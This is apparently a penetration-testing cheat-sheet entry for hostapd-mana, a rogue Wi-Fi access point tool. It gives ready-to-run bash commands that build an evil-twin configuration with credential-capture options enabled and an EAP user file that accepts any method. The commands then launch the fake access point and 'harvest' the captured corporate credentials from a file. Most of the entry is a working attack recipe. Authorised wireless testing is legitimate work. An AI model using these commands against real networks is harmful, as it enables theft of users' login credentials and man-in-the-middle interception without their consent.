# hostapd-mana
% wifi, hostapd-mana, Access Point, rogue AP, evil-twin
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
rogue wifi access point tool. It can be used for a myriad of purposes from tracking and deanonymising devices (aka Snoopy), gathering corporate credentials from devices attempting EAP (aka WPE) or attracting as many devices as possible to connect to perform MitM attacks.
```

## _repo
```
https://github.com/sensepost/hostapd-mana
```

## _doc
```
https://github.com/sensepost/hostapd-mana/wiki
```

## _install
```
```

## create conf
```bash
echo -e '# Interface configuration \n interface=<wlan_interface|wmon> \n ssid=<ssid> \n channel=<wlan_channel> \n auth_algs=3 \n wpa_key_mgmt=WPA-EAP \n wpa_pairwise=TKIP CCMP \n wpa=3 \n hw_mode=g \n ieee8021x=1 \n\n# EAP Configuration \n eap_server=1 \n eap_user_file=hostapd.eap_user \n\n# Mana Configuration \n enable_mana=1 \n mana_loud=1 \n mana_credout=credentials.creds \n mana_eapsuccess=1 \n mana_wpe=1 \n\n# Certificate Configuration \n ca_cert=ca.pem \n server_cert=server.pem \n private_key=server-key.pem \n dh_file=dh.pem' > hostapd.conf
```

## create eap_user
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "<challenge|challenge1234>" [2]' > hostapd.eap_user
```

## launch
```bash
sudo hostapd-mana hostapd.conf
```

## harvest
```bash
cat credentials.creds 
```